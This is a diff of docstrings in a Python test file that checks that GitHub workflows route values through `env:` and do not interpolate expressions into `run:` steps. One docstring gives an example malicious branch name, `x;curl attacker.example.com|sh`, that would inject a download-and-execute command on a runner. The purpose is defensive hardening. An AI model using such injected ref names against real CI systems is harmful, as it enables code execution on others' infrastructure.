@@ -1,10 +1,10 @@
 """Contracts for GitHub workflows, most of which have never executed.
 
-Three of this repository's five workflows have never run once: `pr-sentinel.yml` and
-`recursive-hardening.yml` fire on `pull_request` and `autonomous-triage.yml` on `issues`,
-and in the repository's whole history there have been zero pull requests and zero issues.
-Every commit went straight to `main`, so `ci.yml` accumulated 83 runs and the other three
-accumulated none.
+When these tests were written, three of this repository's five workflows had never run
+once: `pr-sentinel.yml` and `recursive-hardening.yml` fire on `pull_request`, and an issue
+triage workflow (since deleted) fired on `issues`. In the repository's whole history there
+had been zero pull requests and zero issues. Every commit went straight to `main`, so
+`ci.yml` accumulated 83 runs and the other three accumulated none.
 
 That is the repository's own signature defect at the level of process: a gate that has
 never fired is indistinguishable from one that passes. Workflow code is worse than most,
@@ -87,9 +87,10 @@ def test_no_run_step_interpolates_a_workflow_expression(path: Path) -> None:
 
     Git permits `;`, `$`, `(`, `)`, `|` and backticks in a ref name, so a branch called
     `x;curl attacker.example.com|sh` turns `git diff origin/${{ github.base_ref }}` into
-    two commands on the runner. `autonomous-triage.yml` already routes the issue body
-    through `env:` with a comment explaining exactly this; the rule was applied to one
-    workflow and not the other two, which is the shape a never-executed file accumulates.
+    two commands on the runner. The issue triage workflow (since deleted) already routed
+    the issue body through `env:` with a comment explaining exactly this; the rule was
+    applied to one workflow and not the other two, which is the shape a never-executed file
+    accumulates.
 
     Values reach `run:` through `env:`, where they are passed to the process rather than
     pasted into its source. That is GitHub's own hardening guidance and it is mechanical,
